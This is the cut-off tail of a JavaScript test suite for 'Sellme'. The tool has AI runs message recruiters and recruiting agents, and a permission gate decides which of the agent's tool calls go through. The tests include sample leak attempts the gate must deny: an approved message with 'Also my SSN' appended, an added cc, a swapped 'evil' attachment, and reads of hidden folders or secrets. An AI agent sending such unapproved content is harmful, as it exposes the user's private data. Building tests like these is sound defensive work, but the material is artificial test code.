  assert.equal(canSendOn({ agent: "Hedgy", channel: "browser" }), false);
  assert.equal(canSendOn({ agent: "Jack & Jill", channel: "browser" }), true);
  assert.equal(canSendOn({ agent: "Fonzi", channel: "mcp" }), true);
  assert.equal(canSendOn({ agent: "Max", channel: "self" }), false);
});

test("the whole hook: read the page, click the box, type, Enter, and only then can it be marked sent", () => withSandbox(() => {
  const saved = process.env.SELLME_RUN;
  withState((s) => {
    s.autopilot = false;
    s.profile = { name: "Maya", roles: ["Staff Engineer"], floor: "$180K", where: "NYC or remote", never_mention: [] };
    core.addAgent(s, "Jack & Jill", { channel: "browser" });
    const q = core.addDraft(s, { agent: "Jack & Jill", asked: "NYC?", text: "Yes. NYC or remote.", sources: ["profile.where"] });
    core.approve(s, q.id);
  });
  const id = load().queue[0].id;
  const run = "run-1";
  const hook = (call) => {
    const out = gateHook(JSON.stringify(call), { run });
    return out ? JSON.parse(out).hookSpecificOutput.permissionDecision : "";
  };
  const computer = (input) => hook({ hook_event_name: "PreToolUse", tool_name: CHROME("computer"), tool_input: { tabId: 7, ...input } });
  assert.equal(computer({ action: "type", text: "Yes. NYC or remote." }), "deny", "it hasn't seen the tab");
  assert.equal(hook({ hook_event_name: "PostToolUse", tool_name: CHROME("read_page"), tool_input: { tabId: 7 }, tool_response: [{ type: "text", text: JACK_PAGE }, { type: "text", text: tabLine(7, "Jack", "https://app.jackandjill.ai/") }] }), "");
  assert.equal(computer({ action: "left_click", ref: "ref_14" }), "allow");
  assert.equal(hook({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: `sellme sent ${id}` } }), "deny");
  assert.equal(computer({ action: "type", text: "Yes. NYC or remote." }), "allow");
  assert.equal(load().queue[0].send_cleared ?? null, null, "typing isn't sending");
  assert.equal(computer({ action: "key", text: "Return" }), "allow");
  assert.equal(load().queue[0].send_cleared.run, run);
  assert.equal(hook({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: `sellme sent ${id}` } }), "allow");
  assert.equal(computer({ action: "key", text: "Return" }), "deny", "only once");
  // Near the time limit the run is told to close its tab and finish, so stopping it leaves nothing open in Chrome.
  fs.writeFileSync(path.join(home(), `run.wrapup.${run}`), "");
  assert.equal(hook({ hook_event_name: "PreToolUse", tool_name: CHROME("navigate"), tool_input: { tabId: 7, url: "https://app.jackandjill.ai/" } }), "deny");
  assert.match(gateHook(JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command: "sellme ran" } }), { run }), /Time's up/);
  assert.equal(hook({ hook_event_name: "PreToolUse", tool_name: CHROME("tabs_close_mcp"), tool_input: { tabId: 7 } }), "allow");
  fs.rmSync(path.join(home(), `run.wrapup.${run}`));
  if (saved === undefined) delete process.env.SELLME_RUN;
}));

test("found in a real run: the same question read twice stays one item", () => {
  const s = freshState();
  core.addAgent(s, "Chris", { channel: "self", handle: "c@x.com" });
  const first = core.addBlock(s, { agent: "Chris", asked: "Reply with your phone number.", reason: "Not in your facts." });
  const again = core.addBlock(s, { agent: "chris", asked: "reply with  your phone number.", reason: "Same thing, worded differently." });
  assert.equal(again.id, first.id);
  assert.equal(core.openItems(s).length, 1);
  assert.equal(core.addBlock(s, { agent: "Chris", asked: "Your GitHub?", reason: "Not in your facts." }).id === first.id, false, "a different question is its own item");
  core.reject(s, first.id);
  assert.notEqual(core.addBlock(s, { agent: "Chris", asked: "Reply with your phone number.", reason: "They asked again." }).id, first.id, "once it's closed it can come back");
});

test("setup reads a resume only through a copy in its own folder, and keeps only real facts", async () => {
  const { cleanPath, parseResume, readResume, findResume } = await import("../lib/rewrite.js");
  assert.equal(cleanPath("'/Users/m/My Resume.pdf' "), "/Users/m/My Resume.pdf");
  assert.equal(cleanPath("/Users/m/My\\ Resume.pdf"), "/Users/m/My Resume.pdf");
  assert.equal(cleanPath("~/cv.pdf", "/home/m"), "/home/m/cv.pdf");
  assert.deepEqual(parseResume('ok {"name":"Maya","employer":null,"facts":["Led a team of 6","Led a team of 6","  "]}'), { name: "Maya", employer: null, facts: ["Led a team of 6"] });
  assert.ok(parseResume('{"facts":[]}').refused);
  assert.ok(parseResume("not json").refused);
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-cv-"));
  const file = path.join(dir, "Maya CV.pdf");
  fs.writeFileSync(file, "%PDF");
  assert.equal(findResume([dir]), file);
  let seen;
  const run = async (tool, prompt, { cwd }) => {
    seen = { tool, prompt, cwd, files: fs.readdirSync(cwd) };
    return '{"name":"Maya","facts":["Led a team of 6"]}';
  };
  const bin = path.join(dir, "bin");
  fs.mkdirSync(bin);
  fs.writeFileSync(path.join(bin, "claude"), "", { mode: 0o755 });
  const result = await readResume(file, { envPath: bin, run });
  assert.deepEqual(seen.files, ["resume.pdf"]);
  assert.notEqual(seen.cwd, dir);
  assert.ok(seen.tool.args.includes("Read") && seen.tool.args.includes("dontAsk"));
  assert.equal(fs.existsSync(seen.cwd), false, "the copy is cleaned up");
  assert.deepEqual(result.facts, ["Led a team of 6"]);
  assert.ok((await readResume(path.join(dir, "missing.pdf"), { envPath: bin, run })).failed);
});

test("a run can look up and update roles, and a refusal names what it can do instead", () => {
  const s = freshState();
  const bash = (command) => gate({ tool_name: "Bash", tool_input: { command } }, s, { run: "r" });
  for (const cmd of ["role list", "role list --company Acme", "role add --company Acme --stage rejected", "role set r1 --next-call none"]) assert.equal(bash(`sellme ${cmd}`).decision, "allow", cmd);
  const refused = bash("sellme role remove r1");
  assert.equal(refused.decision, "deny");
  assert.match(refused.reason, /role add, role set and role list/);
  assert.match(bash("sellme approve q1").reason, /belongs to the user/);
});

test("a run can mark an item handled, which skips it and says why in Activity", () => {
  const s = state();
  const q = core.addDraft(s, { agent: "Fonzi", asked: "Open to NYC?", text: "Yes, NYC.", sources: ["profile.where"] });
  assert.equal(gate({ tool_name: "Bash", tool_input: { command: `sellme handled ${q.id} --reason "You answered it yourself"` } }, s, { run: "r" }).decision, "allow");
  assert.equal(gate({ tool_name: "Bash", tool_input: { command: `sellme skip ${q.id}` } }, s, { run: "r" }).decision, "deny");
  assert.throws(() => core.markHandled(s, q.id, ""), /reason/);
  core.markHandled(s, q.id, "You answered it yourself");
  assert.equal(q.status, "skipped");
  assert.match(s.notes.at(-1).text, /No reply needed: You answered it yourself/);
  assert.ok(!draftRows(s).some((r) => r.id === q.id), "it's off the list");
  assert.ok(!summary(s).includes("draft"));
  assert.throws(() => core.markHandled(s, q.id, "x"), /isn’t open/);
  // One marked handled before this skips the same way on the next check.
  const old = core.addDraft(s, { agent: "Fonzi", asked: "Remote?", text: "Yes, remote.", sources: ["profile.where"] });
  old.status = "pending";
  old.handled = { reason: "You said it on the call", ts: "x" };
  core.recheckOpen(s);
  assert.equal(old.status, "skipped");
});

test("the gate sends a person's approved message only to their own address, on LinkedIn, email or iMessage", () => {
  const s = freshState();
  core.addRecruiter(s, "Priya Shah", { handle: "linkedin.com/in/priya-shah-test" });
  core.addRecruiter(s, "Jordan Park", { handle: "jordan@talent.example" });
  const li = core.addDraft(s, { agent: "Priya Shah", text: "Hi Priya, happy to talk.", kind: "nudge" });
  const em = core.addDraft(s, { agent: "Jordan Park", text: "Hi Jordan, thanks for the intro.", kind: "nudge", thread: "18f2a00" });
  core.approve(s, li.id);
  core.approve(s, em.id);
  const send = (input) => gate({ tool_name: "mcp__linkedin__send_message", tool_input: input }, s, { run: "r1" });
  assert.equal(send({ linkedin_username: "https://www.linkedin.com/in/priya-shah-test/", message: "Hi Priya, happy to talk.", confirm_send: true }).decision, "allow");
  assert.equal(send({ linkedin_username: "someone-else", message: "Hi Priya, happy to talk.", confirm_send: true }).decision, "deny");
  assert.equal(send({ linkedin_username: "priya-shah-test", message: "Hi Priya, happy to talk. Also my SSN", confirm_send: true }).decision, "deny");
  const mail = (input) => gate({ tool_name: "mcp__claude_ai_Gmail__reply", tool_input: input }, s, { run: "r1" });
  assert.equal(mail({ to: ["jordan@talent.example"], body: em.approved_text, replyThreadId: "18f2a00" }).decision, "allow");
  assert.equal(mail({ to: ["other@talent.example"], body: em.approved_text }).decision, "deny");
  assert.equal(mail({ to: ["jordan@talent.example"], cc: ["x@y.com"], body: em.approved_text }).decision, "deny");
  assert.equal(canSendOn(li), true);
});

test("the logo fits the terminal, and clicks land on the line that was drawn", async () => {
  const { logo } = await import("../lib/render.js");
  const { placeLines } = await import("../lib/picker.js");
  const { tabSpots } = await import("../lib/app.js");
  assert.equal(logo(c, 120, 40).split("\n").length, 5);
  assert.equal(logo(c, 120, 20).split("\n").length, 3);
  assert.equal(logo(c, 30, 40), "SELLME");
  assert.deepEqual(placeLines("short\n" + "x".repeat(150) + "\nnext", 100), [0, 1, 3]);
  const spots = tabSpots();
  assert.deepEqual(spots.slice(0, 2).map((t) => [t.tab, t.from, t.to]), [["Inbox", 0, 8], ["Pipeline", 8, 19]]);
});

test("a resume goes as the file by email, filled in by the gate, and as a link anywhere else", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-cv-"));
  const file = path.join(dir, "Maya Resume.pdf");
  fs.writeFileSync(file, Buffer.from("%PDF-1.4 maya"));
  const s = freshState();
  core.addRecruiter(s, "Jordan Park", { handle: "jordan@talent.example" });
  core.addRecruiter(s, "Alex Kim", { handle: "linkedin.com/in/alex-kim-test" });
  const says = core.addDraft(s, { agent: "Jordan Park", text: "Hi Jordan, my resume is attached.", kind: "nudge", thread: "msg0001" });
  assert.equal(says.status, "blocked");
  assert.match(says.check.reasons[0].message, /says something is attached, but nothing is/);
  assert.throws(() => core.attachResume(s, says.id), /sellme profile set resume/);
  core.setResume(s, { file });
  core.attachResume(s, says.id);
  assert.equal(says.status, "pending");
  core.approve(s, says.id);
  assert.deepEqual(core.outbox(s)[0].attach, { filename: "Maya Resume.pdf", content: core.ATTACH_TOKEN });
  const reply = (input) => gate({ tool_name: "mcp__claude_ai_Gmail__reply", tool_input: input }, s, { run: "r1" });
  const base = { messageId: "msg0001", to: ["jordan@talent.example"], body: says.approved_text };
  assert.match(reply(base).reason, /goes with the user's resume/);
  assert.match(reply({ ...base, attachments: [{ filename: "x.pdf", content: "JVBERi0xLjQgZXZpbA==" }] }).reason, /goes with the user's resume/);
  const ok = reply({ ...base, attachments: [{ filename: "Maya Resume.pdf", content: core.ATTACH_TOKEN }] });
  assert.equal(ok.decision, "allow");
  assert.deepEqual(ok.updatedInput.attachments, [{ filename: "Maya Resume.pdf", mimeType: "application/pdf", content: Buffer.from("%PDF-1.4 maya").toString("base64") }]);
  assert.equal(ok.updatedInput.body, base.body);
  const hook = JSON.parse(gateHook(JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "mcp__claude_ai_Gmail__reply", tool_input: { ...base, attachments: [{ content: core.ATTACH_TOKEN }] } }), { run: "r2" }) || "{}");
  assert.ok(hook.hookSpecificOutput);
  const li = core.addDraft(s, { agent: "Alex Kim", text: "Hi Alex, sure.", kind: "nudge" });
  core.attachResume(s, li.id);
  assert.equal(li.attach, "manual", "no link yet: it still sends, and you attach the file in the chat");
  assert.equal(chatLink(li), "https://www.linkedin.com/in/alex-kim-test/");
  core.attachResume(s, li.id, false);
  core.setResume(s, { link: "https://drive.google.com/file/d/1aB2/view" });
  core.attachResume(s, li.id);
  assert.equal(li.text, "Hi Alex, sure. My resume: https://drive.google.com/file/d/1aB2/view");
  assert.equal(li.status, "pending");
  assert.equal(li.attach, "link");
  core.attachResume(s, li.id, false);
  assert.equal(li.text, "Hi Alex, sure.");
  const plain = core.addDraft(s, { agent: "Alex Kim", text: "Hi Alex, thanks.", kind: "nudge" });
  core.approve(s, plain.id);
  const sneak = gate({ tool_name: "mcp__linkedin__send_message", tool_input: { linkedin_username: "alex-kim-test", message: "Hi Alex, thanks.", attachments: [{ content: "abc" }] } }, s, { run: "r1" });
  assert.equal(sneak.decision, "deny");
});

test("every AI Sellme starts gets the same opening the skill file has, the one the deck shows", async () => {
  const { PERSONA } = await import("../lib/persona.js");
  const { resumePrompt } = await import("../lib/rewrite.js");
  const skill = fs.readFileSync(new URL("../skill/SKILL.md", import.meta.url), "utf8");
  assert.ok(skill.includes(PERSONA), "SKILL.md opens with the persona, word for word");
  assert.ok(resumePrompt("resume.pdf").startsWith(PERSONA));
  const s = freshState();
  core.addAgent(s, "Fonzi");
  const q = core.addDraft(s, { agent: "Fonzi", asked: "Team size?", text: "Led a team.", kind: "nudge" });
  core.instruct(s, q.id, "shorter");
  assert.ok(rewritePrompt(s, s.queue[0]).startsWith(PERSONA));
});

test("an answer only the user could give is remembered once it's sent, and a used note is cleared", () => {
  const s = freshState();
  core.addAgent(s, "Standout", { channel: "imessage", handle: "+14155550100" });
  const q = core.addBlock(s, { agent: "Standout", asked: "Are you OK with occasional travel to the Bay Area?", reason: "Your facts say nothing about travel." });
  core.instruct(s, q.id, "say yes, I can travel sometimes");
  core.setSuggestion(s, q.id, "Yes, Maya is happy to travel to the Bay Area from time to time.");
  assert.equal(q.instructions, null, "the note was used, so the next one starts fresh");
  core.answerYourself(s, q.id, q.suggestion, { confirmSensitive: true });
  core.markSent(s, q.id);
  assert.equal(q.remembered, true);
  assert.match(s.facts.at(-1).text, /^Asked “Are you OK with occasional travel to the Bay Area\?”, you said: “Yes, Maya is happy to travel/);
  assert.match(s.facts.at(-1).source, /^your answer to Standout, \d{4}-\d{2}-\d{2}$/);
  const slot = core.addBlock(s, { agent: "Standout", asked: "Free Tuesday at 3?", reason: "Your calendar." });
  core.answerYourself(s, slot.id, "Tuesday at 3 works.", { confirmSensitive: true });
  core.markSent(s, slot.id);
  assert.equal(s.facts.length, 1, "times change, so they aren't remembered");
});

test("a fast send is one exact tool call, and only a send the gate cleared and the tool confirmed counts", async () => {
  const { fastPlan, confirmSend } = await import("../lib/agent.js");
  assert.equal(fastPlan({ channel: "imessage", to: "+15550111", text: "Hi." }).tool, "mcp__messages__tool_send_message");
  assert.deepEqual(fastPlan({ channel: "linkedin", to: "linkedin.com/in/x", text: "Hi." }).input, { linkedin_username: "linkedin.com/in/x", message: "Hi.", confirm_send: true });
  assert.deepEqual(fastPlan({ channel: "email", person: true, to: "a@b.co", subject: "Maya", text: "Hi.", attach: { filename: "cv.pdf", content: "SELLME_RESUME" } }).input.attachments, [{ filename: "cv.pdf", content: "SELLME_RESUME" }]);
  for (const o of [{ thread: "m1" }, { reply: true }, {}]) {
    const plan = fastPlan({ channel: "email", person: true, to: "a@b.co", subject: "Maya", text: "Hi.", attach: { filename: "cv.pdf", content: "SELLME_RESUME" }, ...o });
    assert.match(plan.prompt, /SELLME swaps in the user's real resume/, "a run must not refuse the placeholder as a broken file");
  }
  assert.doesNotMatch(fastPlan({ channel: "email", person: true, to: "a@b.co", subject: "Maya", text: "Hi.", thread: "m1" }).prompt, /swaps in/);
  assert.equal(fastPlan({ channel: "email", to: "bot@boardy.ai", text: "Hi." }), null, "a bot's email thread goes through the skill");
  assert.equal(fastPlan({ channel: "browser", text: "Hi." }), null);
  const s = freshState();
  s.queue.push({ id: "q1", status: "approved", send_cleared: { run: "r1" } });
  const update = (fn) => fn(s);
  confirmSend({ tool_name: "mcp__messages__tool_send_message", tool_response: [{ type: "text", text: "Error: not delivered" }] }, "r1", { update });
  assert.equal(s.queue[0].send_confirmed, undefined, "an error isn't a send");
  confirmSend({ tool_name: "mcp__messages__tool_send_message", tool_response: [{ type: "text", text: "Message sent" }] }, "r2", { update });
  assert.equal(s.queue[0].send_confirmed, undefined, "another run's send doesn't count");
  confirmSend({ tool_name: "mcp__messages__tool_send_message", tool_response: [{ type: "text", text: "Message sent" }] }, "r1", { update });
  assert.equal(s.queue[0].send_confirmed.run, "r1");
});

test("a reply that says the resume is attached still goes on LinkedIn, and you attach it in the chat", () => {
  const s = freshState();
  core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/ben-ford-test" });
  const q = core.addBlock(s, { agent: "Dana Ford", asked: "Send your resume?", reason: "Submitting you is yours.", suggest: "Yes, please submit me. My resume is attached." });
  assert.throws(() => core.answerYourself(s, q.id, q.suggestion, { confirmSensitive: true }), /attached, but nothing is/);
  core.attachResume(s, q.id);
  assert.equal(q.attach, "manual");
  core.answerYourself(s, q.id, q.suggestion, { confirmSensitive: true });
  assert.deepEqual(core.outbox(s).map((o) => [o.channel, o.attach ?? null]), [["linkedin", null]]);
});

test("a draft row is a short preview that never wraps, even with a tag", () => {
  const strip = (t) => t.replace(/\x1b\[[0-9;]*m/g, "");
  const row = { mark: "?", agent: "Dana Ford", text: "Yes, please go ahead and submit me. My email is maya@example.com, my LinkedIn is linkedin.com/in/maya", flag: "note for the AI" };
  for (const width of [80, 120, 200]) {
    const line = strip(draftLine(row, " ", c, width));
    assert.ok(line.length <= Math.min(width, 120), `${width}: ${line.length}`);
    assert.match(line, /… · note for the AI$/);
  }
});

test("a LinkedIn reply never goes to a Gmail id: it uses the contact's real conversation, or finds it", async () => {
  const { linkedinChromePlan } = await import("../lib/agent.js");
  const s = freshState();
  core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/dana-ford-test" });
  const old = core.addDraft(s, { agent: "Dana Ford", asked: "Free Thu?", text: "Yes, Thu works.", kind: "nudge", thread: "2-AbC123xyz" });
  Object.assign(old, { status: "sent", sent_at: new Date().toISOString() });
  const q = core.addDraft(s, { agent: "Dana Ford", asked: "And Fri?", text: "Fri works too.", kind: "nudge", thread: "18c0ffee12345678", byUser: true });
  core.approve(s, q.id);
  assert.equal(core.outbox(s)[0].thread, "2-AbC123xyz", "the contact's last LinkedIn conversation");
  assert.match(linkedinChromePlan(core.outbox(s)[0]).prompt, /messaging\/thread\/2-AbC123xyz/);
  assert.match(linkedinChromePlan(core.outbox(s)[0]).prompt, /no longer with Dana Ford/, "a conversation LinkedIn switched away from is caught before Send");
  s.queue = s.queue.filter((x) => x !== old);
  assert.equal(core.outbox(s)[0].thread, undefined, "none on record: the send looks it up");
  s.queue.push(old);
  const { gate } = await import("../lib/agent.js");
  const browser = { tabs: { 5: "linkedin.com" }, urls: { 5: "https://www.linkedin.com/messaging/thread/2-AbC123xyz/" }, refs: { 5: { ref_1: "box" } }, typed: {} };
  core.claimSend(s, q.id, "r1");
  const type = gate({ tool_name: "mcp__claude-in-chrome__computer", tool_input: { action: "type", tabId: 5, text: "Fri works too." } }, s, { run: "r1", browser });
  assert.equal(type.decision, "allow", "the gate opens the same conversation the send does");
  assert.equal(core.setThread(s, q.id, "2-Real456").thread, "2-Real456", "the real id replaces the Gmail one");
});

test("a LinkedIn reply goes into its own conversation in Chrome, never a new chat, and only there", async () => {
  const { linkedinChromePlan, fastPlan: toolPlan } = await import("../lib/agent.js");
  const fastPlan = linkedinChromePlan;
  const s = freshState();
  core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/ben-ford-test" });
  const q = core.addDraft(s, { agent: "Dana Ford", asked: "Can you talk this morning?", text: "Yes, any time this morning.", kind: "nudge", thread: "https://www.linkedin.com/messaging/thread/2-AbC123xyz/" });
  assert.equal(q.thread, "2-AbC123xyz");
  core.approve(s, q.id);
  const o = core.outbox(s)[0];
  const plan = fastPlan(o);
  assert.equal(plan.chrome, true);
  assert.match(plan.prompt, /linkedin\.com\/messaging\/thread\/2-AbC123xyz\//);
  assert.ok(!plan.tools.includes("mcp__linkedin__send_message"), "never the tool that starts a new chat");
  const nav = (url) => gate({ tool_name: "mcp__claude-in-chrome__navigate", tool_input: { url } }, s, { run: "r1" }).decision;
  assert.equal(nav("https://www.linkedin.com/messaging/thread/2-AbC123xyz/"), "allow");
  assert.equal(nav("https://www.linkedin.com/messaging/thread/2-SomeoneElse/"), "allow", "reading any conversation is fine; typing in it isn't");
  assert.equal(nav("https://www.linkedin.com/dms/prv/D4E10AQ/messaging-attachmentFile/0/jd.pdf"), "allow", "a file sent in a message can be read");
  assert.equal(nav("https://media.licdn.com/dms/document/C4E10AQ/jd.pdf"), "allow");
  assert.equal(nav("https://www.linkedin.com/feed/"), "deny");
  assert.equal(gate({ tool_name: "mcp__claude-in-chrome__navigate", tool_input: { url: "https://www.linkedin.com/dms/prv/x/jd.pdf" } }, s, { run: "r1", linkedin: false }).decision, "deny", "only a LinkedIn run opens LinkedIn");
  const browser = { tabs: { 5: "linkedin.com", 6: "linkedin.com" }, urls: { 5: "https://www.linkedin.com/messaging/thread/2-AbC123xyz/", 6: "https://www.linkedin.com/messaging/thread/2-SomeoneElse/" }, refs: { 5: { ref_1: "box" }, 6: { ref_1: "box" } }, typed: {} };
  const type = (tabId) => gate({ tool_name: "mcp__claude-in-chrome__computer", tool_input: { action: "type", tabId, text: "Yes, any time this morning." } }, s, { run: "r1", browser }).decision;
  assert.equal(type(5), "allow");
  assert.equal(type(6), "deny", "someone else's conversation can't take it");
  // Enter on LinkedIn can just add a line, so only the Send button counts as sending.
  browser.typed[5] = q.id;
  browser.refs[5].ref_2 = "send";
  const act = (input) => gate({ tool_name: "mcp__claude-in-chrome__computer", tool_input: { tabId: 5, ...input } }, s, { run: "r1", browser });
  assert.equal(act({ action: "key", text: "Return" }).decision, "deny");
  assert.equal(act({ action: "left_click", ref: "ref_2" }).cleared, q.id);
  assert.match(plan.prompt, /left_click the Send button/);
  assert.match(plan.prompt, /Never press Return/);
  core.addRecruiter(s, "Sam Rivera", { handle: "linkedin.com/in/samrivera42" }); // No conversation on record yet.
  const noThread = core.addDraft(s, { agent: "Sam Rivera", asked: "Rate?", text: "Happy to discuss.", kind: "nudge" });
  core.approve(s, noThread.id);
  const lookup = fastPlan(core.outbox(s).find((x) => x.id === noThread.id));
  assert.match(lookup.prompt, /get_conversation[\s\S]*thread q\d+ <that thread_id>/, "a reply with no conversation on record looks it up first");
  const first = core.addDraft(s, { agent: "Dana Ford", text: "Hi Dana, Maya here.", kind: "nudge" });
  core.approve(s, first.id);
  assert.equal(toolPlan(core.outbox(s).find((x) => x.id === first.id)).tool, "mcp__linkedin__send_message", "a first message starts the chat");
});

test("asked for a resume by email, the PDF goes with the answer without anyone pressing anything", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "sellme-cv-"));
  const file = path.join(dir, "cv.pdf");
  fs.writeFileSync(file, "%PDF-1.4");
  const s = freshState();
  core.setResume(s, { file });
  core.addRecruiter(s, "Robin Stone", { handle: "meg@talent.example" });
  const q = core.addDraft(s, { agent: "Robin Stone", asked: "Could you send over a resume ahead of Monday?", text: "Of course, here it is.", kind: "nudge" });
  assert.equal(q.attach, "file");
  const plain = core.addDraft(s, { agent: "Robin Stone", asked: "Free Monday?", text: "Monday works.", kind: "nudge" });
  assert.equal(plain.attach, undefined);
});

test("an email reply goes on the newest message of its thread with reply-all, never as a new email, never another thread", async () => {
  const { fastPlan } = await import("../lib/agent.js");
  const s = freshState();
  s.profile.name = "Maya";
  core.addRecruiter(s, "Lee Park", { handle: "lee@talent.example" });
  const q = core.addDraft(s, { agent: "Lee Park", asked: "Boardy intro: want to chat?", text: "Hi Lee, thanks Boardy. Happy to chat.", kind: "nudge", thread: "18f2abc901" });
  core.approve(s, q.id);
  const plan = fastPlan(core.outbox(s)[0]);
  assert.match(plan.prompt, /get_message[\s\S]*"18f2abc901"[\s\S]*get_thread[\s\S]*newest message[\s\S]*"replyAll": true/);
  const browser = { tabs: {}, urls: {}, refs: {}, typed: {} };
  const send = (tool, input) => gate({ tool_name: `mcp__claude_ai_Gmail__${tool}`, tool_input: input }, s, { run: "r1", browser });
  assert.equal(send("reply", { messageId: "18f2abc901", body: q.text, replyAll: true }).decision, "allow");
  assert.equal(send("reply", { messageId: "newerMsg77", body: q.text, replyAll: true }).decision, "deny", "not until the run has read the thread");
  // The run reads the thread: someone wrote since, so the reply goes on that newest message.
  learnFromTool({ tool_name: "mcp__claude_ai_Gmail__get_thread", tool_response: [{ type: "text", text: JSON.stringify({ id: "18f2abc901", messages: [{ id: "18f2abc901" }, { id: "newerMsg77" }] }) }] }, browser);
  learnFromTool({ tool_name: "mcp__claude_ai_Gmail__search_threads", tool_response: JSON.stringify({ threads: [{ id: "otherThr", messages: [{ id: "someOtherMsg", threadId: "otherThr" }] }] }) }, browser);
  assert.equal(send("reply", { messageId: "newerMsg77", body: q.text, replyAll: true }).decision, "allow");
  assert.equal(send("reply", { messageId: "someOtherMsg", body: q.text, replyAll: true }).decision, "deny", "another thread");
  assert.match(send("send_message", { to: ["lee@talent.example"], subject: "Maya", body: q.text }).reason, /goes in their thread/);
  const noThread = core.addDraft(s, { agent: "Lee Park", asked: "Free Friday?", text: "Friday works.", kind: "nudge" });
  core.approve(s, noThread.id);
  assert.match(fastPlan(core.outbox(s).find((o) => o.id === noThread.id)).prompt, /search_threads[\s\S]*thread q\d+ <that message id>[\s\S]*"replyAll": true/);
});

test("a check knows who to push next: when each contact last heard from the user, and calls that just happened", () => {
  const s = freshState();
  core.addAgent(s, "Fonzi");
  core.addRecruiter(s, "Sam Rivera", { handle: "+15550111" });
  const q = core.addDraft(s, { agent: "Sam Rivera", text: "Hi Sam, any update?", kind: "nudge" });
  core.approve(s, q.id);
  core.markSent(s, q.id);
  core.addRole(s, { company: "Acme", agent: "Fonzi", stage: "interview" });
  s.roles[0].next_call = new Date(Date.now() - 3 * 3600_000).toISOString();
  core.addRole(s, { company: "Gone", agent: "Fonzi", stage: "rejected" });
  s.roles[1].next_call = new Date(Date.now() - 3 * 3600_000).toISOString();
  const push = core.pushList(s);
  assert.deepEqual(push.contacts.map((x) => [x.agent, Boolean(x.last_sent), x.person]), [["Fonzi", false, false], ["Sam Rivera", true, true]]);
  assert.deepEqual(push.calls_to_follow_up.map((x) => x.company), ["Acme"], "a rejected role gets no follow-up");
});

test("the live line says it's selling you, what it's reading, and for how long", () => {
  const line = liveLine(0, 1000, ["Reading iMessage", "Reading Fonzi"], c, 43_000);
  assert.match(line, /Selling you to my agentic friends · Reading Fonzi 0:42$/);
});

// A LinkedIn reply goes through Chrome; a plan that isn't Chrome fails here, so these tests catch one sneaking back.
const toolDown = (r) => (p, o) => (o.fast?.chrome ? r(p, o) : { ok: false, output: "not connected", failed: "not connected" });

test("a LinkedIn send counts only when the run saw it land, not when the click went through", () => withSandbox(async () => {
  const { sendOutbox } = await import("../lib/agent.js");
  withState((s) => {
    Object.assign(s, { setup_done: true });
    core.addRecruiter(s, "Dana Ford", { handle: "linkedin.com/in/ben-ford-test" });
    const q = core.addDraft(s, { agent: "Dana Ford", asked: "Talk today?", text: "Yes, glad to.", kind: "nudge", thread: "2-AbC123xyz" });
    if (q.status !== "approved") core.approve(s, q.id);
  });
  const id = load().queue[0].id;
  const runner = (output) => async (_, { run }) => {
    withState((s) => {
      const q = s.queue.find((x) => x.id === id);
      q.send_cleared = { run, ts: new Date().toISOString() };
      q.send_confirmed = { run, ts: new Date().toISOString() };
    });
    return { ok: true, output };
  };
  const failed = await sendOutbox(id, { runner: toolDown(runner("failed: the message is still in the box")) });
  assert.equal(failed.sent, false);
  assert.equal(load().queue[0].status, "approved");
  const sent = await sendOutbox(id, { runner: toolDown(runner("sent")) });
  assert.equal(sent.sent, true);
  assert.equal(load().queue[0].status, "sent");
}));

test("an approved message shows a spinner by the name while it goes, and a failed one asks for a click", () => {
  const s = freshState();
  s.autopilot = false;
  core.addAgent(s, "Fonzi");
  const q = core.addDraft(s, { agent: "Fonzi", text: "Any new roles?", kind: "nudge" });
  core.approve(s, q.id);
  const now = Date.now();
  const going = draftRows(s, { going: new Map([[q.id, { started: now - 4000 }]]), frame: 1, now });
  assert.ok(going.some((r) => r.heading === "Selling you now"));
  const row = going.find((r) => r.id === q.id);
  assert.equal(row.sending, true);
  assert.equal(row.mark, "⠙");
  assert.match(row.status.label, /sending 0:04/);
  assert.equal(row.text, "Any new roles?", "it shows what's going out");
  const failed = draftRows(s, { failed: new Map([[q.id, "No reply from Chrome"]]) }).find((r) => r.id === q.id);
  assert.equal(failed.mark, "✗");
  assert.match(failed.text, /No reply from Chrome · click to try again/);
  assert.match(summary(s), /selling you to 1 now/);
});

test("one sender at a time: a message the app is sending can't be sent by a check too", () => {
  const s = freshState();
  s.autopilot = false;
  core.addAgent(s, "Fonzi");
  const q = core.addDraft(s, { agent: "Fonzi", text: "Any new roles?", kind: "nudge" });
  core.approve(s, q.id);
  assert.equal(core.claimSend(s, q.id, "app"), true);
  assert.equal(core.claimedElsewhere(q, "check"), true);
  assert.equal(core.claimedElsewhere(q, "app"), false);
  assert.equal(core.claimSend(s, q.id, "check"), false, "taken");
  q.sending.pid = 999999; // The app that claimed it has quit.
  assert.equal(core.claimSend(s, q.id, "check"), true);
  core.releaseSend(s, q.id, "check");
  q.send_cleared = { run: "check2", ts: new Date().toISOString() }; // A check just pressed send on it.
  assert.equal(core.claimSend(s, q.id, "app"), false);
});

test("an iMessage agent a scheduled check flagged for access is connected again once this terminal can read Messages", () => withSandbox(async () => {
  withState((s) => {
    core.addAgent(s, "Clera", { channel: "imessage", handle: "+15550001111" });
    core.setConnection(s, "Clera", "access");
  });
  assert.deepEqual(refreshConnections({ hosts: [], messages: () => false }), []);
  assert.equal(load().connections.Clera.status, "access");
  assert.deepEqual(refreshConnections({ hosts: [], messages: () => true }), ["Clera"]);
  assert.equal(load().connections.Clera, undefined, "no flag left");
}));

test("a run can read the user's own files to find their answer, but never hidden folders, Library or secrets", async () => {
  const { researchable } = await import("../lib/agent.js");
  const h = "/Users/sam";
  for (const ok of ["/Users/sam/Documents/projects/notes.md", "~/Desktop/resume.pdf", "/Users/sam/resume"]) assert.equal(researchable(ok.replace("~", h), h), true, ok);
